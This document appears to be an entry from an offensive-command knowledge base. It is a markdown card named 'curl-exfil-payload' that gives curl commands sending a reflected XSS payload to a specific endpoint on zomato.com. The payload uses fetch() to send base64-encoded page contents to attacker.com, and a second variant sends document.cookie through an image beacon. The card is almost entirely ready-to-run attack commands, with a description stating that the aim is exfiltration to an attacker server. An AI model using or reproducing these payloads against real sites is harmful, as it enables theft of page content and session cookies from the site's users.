---
id: cmd-uuid-3
data: >-
  curl
  "https://www.zomato.com/php/instagram_tag_relay?callback=%3E%3Cimg+src%3Dx+onerror%3Dfetch('https://attacker.com/exfil?data%3D'+btoa(document.body.innerHTML))%3E"
tags:
  - exfiltration
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:47.290Z'
verified: false
validated: true
submitted: true
---
# curl-exfil-payload

## Command

```bash
curl "https://www.zomato.com/php/instagram_tag_relay?callback=%3E%3Cimg+src%3Dx+onerror%3Dfetch('https://attacker.com/exfil?data%3D'+btoa(document.body.innerHTML))%3E"
```

## Description

Injects an XSS payload to exfiltrate page content via base64-encoded fetch to attacker server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| callback | Encoded exfil payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.zomato.com/php/instagram_tag_relay?callback=%3E%3Cimg+src%3Dx+onerror%3Dfetch('https://attacker.com/exfil?data%3D'+btoa(document.body.innerHTML))%3E"
```

### Simplified Img Beacon

```bash
curl "https://www.zomato.com/php/instagram_tag_relay?callback=%3E%3Cimg+src%3Dhttps://attacker.com/log?data="+document.cookie%3E"
```

## Expected Output

Reflected payload in response; execution sends data to attacker.com.

## Related

- [[procedures/Exfiltrate-Sensitive-Data-via-XSS]]
